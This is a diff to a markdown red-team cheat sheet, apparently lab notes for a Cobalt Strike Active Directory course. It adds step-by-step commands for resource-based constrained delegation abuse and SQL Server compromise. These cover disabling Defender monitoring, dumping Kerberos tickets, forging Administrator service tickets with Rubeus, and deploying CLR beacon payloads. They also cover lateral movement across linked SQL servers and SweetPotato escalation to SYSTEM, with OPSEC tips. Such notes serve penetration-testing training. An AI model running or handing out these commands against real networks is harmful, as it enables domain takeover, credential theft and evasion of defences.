@@ -642,12 +642,60 @@ beacon> kerberos_ticket_purge
 ### RBCD (Resource-Based Constrained Delegation)
 
 ```cs
-// Requires: WriteProperty on target computer object
-// Setup via SOCKS + Proxifier + PowerView/Impacket
-// 1. Create a new machine account (Impacket addcomputer.py via proxychains)
-// 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target computer to new machine SID
-// 3. S4U2Proxy from new machine to get service ticket as DA
-beacon> krb_s4u /ticket:[machine TGT] /service:cifs/<target> /impersonateuser:Administrator
+// Requires: principal with WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity (ACE type 3f78c3e5-...)
+// Lab flow — uses rsteel (Server Admins group) + SOCKS/Proxifier + Rubeus on attacker desktop
+
+// --- PHASE 1: SOCKS setup (from pchilds medium-integrity beacon) ---
+beacon> socks 1080 socks5
+// Proxifier → add team server 10.0.0.5:1080 SOCKS5 → rule: 10.10.120.0/23 → SOCKS5
+
+// On attacker desktop (admin PowerShell):
+Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+// --- PHASE 2: Get LDAP ticket via pchilds delegation ---
+beacon> krb_tgtdeleg    // from pchilds beacon — OPSEC-🟢SAFE, no SYSTEM needed
+// Copy base64 TGT output
+
+runas /netonly /user:CONTOSO\pchilds powershell    // attacker desktop
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[pchilds-TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
+
+// --- PHASE 3: Enumerate via PowerView (in runas pchilds powershell) ---
+ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
+Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
+// Resolve SID:
+Get-DomainObject -LDAPFilter '(objectSid=<SID>)' -Server 'lon-dc-1'
+// ⚠️ Lab: SID 1107 = "Server Admins" group, member rsteel. Controls: FS-1, WS-1, DB-1, DB-2, CS-1
+
+// --- PHASE 4: Get rsteel LDAP ticket (from SYSTEM beacon) ---
+beacon> krb_triage    // find rsteel LUID — varies per session, do NOT hardcode
+beacon> krb_dump /luid:<rsteel-LUID> /service:krbtgt    // ⚠️ no 0x prefix
+// In runas pchilds powershell:
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[rsteel-TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
+
+// --- PHASE 5: Check existing RBCD and add entry ---
+Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+// ⚠️ LON-FS-1 already has LON-WS-1 — must preserve it
+$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
+$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
+Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'
+
+// --- PHASE 6: Dump machine TGT and S4U (from SYSTEM beacon) ---
+beacon> krb_dump /luid:3e7 /service:krbtgt    // lon-wkstn-1$ machine TGT, SYSTEM required, no 0x prefix
+// In runas pchilds powershell:
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[wkstn1-TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
+// ⚠️ Rubeus writes: _cifs_lon-fs-1 (no extension, underscore prefix) — check exact filename in output
+
+// --- PHASE 7: Inject and access (in beacon) ---
+// make_token OPTIONAL — lab-confirmed working without it (no Event 4648)
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
+beacon> ls \\lon-fs-1\c$
+beacon> rev2self
+beacon> kerberos_ticket_purge
+
+// --- PHASE 8: Restore RBCD ---
+Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
 ```
 
 ### Service Name Substitution (S4U2self abuse)
@@ -662,45 +710,77 @@ beacon> krb_s4u /ticket:[TGT] /service:host/<target> /impersonateuser:Administra
 
 ## Phase 14 — SQL Servers
 
+> ⚠️ **BEACON CONTEXT IS CRITICAL — wrong beacon = permission denied (42000). Each command is labelled.**
+>
+> Beacon chain built in this phase:
+> `wkstn-1 (pchilds) → wkstn-1 (rsteel) → [sql-clr] → lon-db-1 (mssql_svc, SMB) → [link from lon-db-1] → lon-db-2 (mssql_svc, SMB) → [SweetPotato] → lon-db-2 (SYSTEM, tcp-local)`
+
 ```cs
+// ── SETUP ─────────────────────────────────────────────────────────────────────
 // Load SQL-BOF: Cobalt Strike > Script Manager > Load > C:\Tools\SQL-BOF\SQL\SQL.cna
+// Load Kerbeus: C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
 
-// Enumerate SQL servers via LDAP SPN query (OPSEC-🟢SAFE)
+// ── ENUMERATION [BEACON: wkstn-1 | USER: pchilds] ────────────────────────────
 beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
-
-beacon> sql-info lon-db-1
-beacon> sql-whoami lon-db-1           // check current privilege level
-
-// Enumerate SQL admin group members
+// Note SPN: MSSQLSvc/lon-db-1.contoso.com:1433 — needed for ticket requests
+beacon> sql-info lon-db-1       // IsSysAdmin: False as pchilds
+beacon> sql-whoami lon-db-1     // guest/public as pchilds — need sysadmin user
 beacon> ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
+// Lab: CN=Database Admins, member: rsteel → sysadmin on lon-db-1 AND lon-db-2
 
-// Impersonate sysadmin user → steal token or inject ticket
-beacon> steal_token <rsteel-pid>
-beacon> sql-whoami lon-db-1           // should now show sysadmin
+// ── IMPERSONATE SYSADMIN [BEACON: wkstn-1 | USER: pchilds → rsteel] ──────────
+beacon> ps    // find rsteel process (cmd.exe, mmc.exe)
+beacon> steal_token <rsteel-pid>     // OPSEC-🟢SAFE
+beacon> getuid                       // confirm CONTOSO\rsteel
+beacon> sql-whoami lon-db-1          // now: sysadmin on lon-db-1 ✓
 
-// Enable CLR + deploy CLR payload (builds MyProcedure.dll with embedded SMB shellcode)
+// ── CODE EXECUTION ON LON-DB-1 [BEACON: wkstn-1 | USER: rsteel] ──────────────
+beacon> sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
 beacon> sql-enableclr lon-db-1
 beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
+// Wait ~10s for SMB beacon to spawn in sqlservr.exe on lon-db-1
 
-// Link to SQL beacon (run from pchilds beacon — auto-requests CIFS ticket)
+// ── LINK TO LON-DB-1 [BEACON: wkstn-1 | USER: pchilds OR rsteel] ─────────────
+// pchilds has TGT → auto-requests cifs/lon-db-1 ticket for SMB auth
 beacon> link lon-db-1 <SMB-PIPENAME>
+// [+] established link to child beacon: 10.10.120.20
 
-// Lateral movement via SQL linked server
-beacon> sql-links lon-db-1
-beacon> sql-whoami lon-db-1 "" lon-db-2
-beacon> sql-enablerpc lon-db-1 lon-db-2
-beacon> sql-clr lon-db-1 C:\...\MyProcedure.dll MyProcedure "" lon-db-2
-// From lon-db-1 beacon:
+beacon> sql-disableclr lon-db-1     // clean up immediately after linking
+
+// ── LATERAL MOVEMENT: LON-DB-1 → LON-DB-2 ────────────────────────────────────
+// ⚠️ ALL sql-* commands below: [BEACON: wkstn-1 | USER: rsteel]
+// ⚠️ DO NOT run from lon-db-1 mssql_svc beacon — mssql_svc = guest/public on lon-db-2 → 42000 error
+
+beacon> sql-links lon-db-1                      // confirm LON-DB-2 linked server exists
+beacon> sql-whoami lon-db-1 "" lon-db-2         // as rsteel: sysadmin ✓ | as mssql_svc: guest ✗
+beacon> sql-checkrpc lon-db-1                   // LON-DB-2: is_rpc_out_enabled = 0
+beacon> sql-enablerpc lon-db-1 lon-db-2         // enable RPC Out (OPSEC-🟠CAUTION — logged)
+beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
+// Wait ~10s for SMB beacon in lon-db-2 sqlservr.exe
+
+// ── LINK TO LON-DB-2 [BEACON: lon-db-1 | USER: mssql_svc] ───────────────────
+// ⚠️ MUST run from lon-db-1 beacon — lon-db-2 only reachable via lon-db-1 (separate network segment)
+// Switch to lon-db-1 beacon in CS
 beacon> link lon-db-2 <SMB-PIPENAME>
+// [+] established link to child beacon: 10.10.120.25
 
-// Privilege escalation via SeImpersonatePrivilege (SweetPotato)
-beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
-beacon> connect localhost 1337        // link to SYSTEM beacon
-
-// Clean up
-beacon> sql-disableclr lon-db-1
+// From wkstn-1 (rsteel) — clean up:
 beacon> sql-disablerpc lon-db-1 lon-db-2
+
+// ── PRIVESC: SYSTEM ON LON-DB-2 [BEACON: lon-db-2 | USER: mssql_svc] ─────────
+// Switch to lon-db-2 CLR beacon
+beacon> getuid    // CONTOSO\mssql_svc — has SeImpersonatePrivilege
+beacon> cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
+beacon> upload C:\Payloads\tcp-local_x64.exe
+beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
+// PrintSpoofer method used — [+] Process created, enjoy!
+beacon> connect localhost 1337    // link tcp-local SYSTEM beacon
+// [+] established link — getuid → NT AUTHORITY\SYSTEM on lon-db-2 ✓
 ```
+
+> ⚠️ **42000 permission error on lon-db-2:** Caused by running `sql-clr ... "" lon-db-2` from the lon-db-1 mssql_svc beacon. Fix: run from wkstn-1 as rsteel. Leftover hash in `sys.trusted_assemblies` is auto-cleaned by SQL-BOF on next attempt.
+>
+> ⚠️ **SMB listener pipe name:** Use custom name (not default `TSVCPIPE-*`). Lab used `TSVCPIPE-4b2f70b3-juan-...`.
 
 ---
 
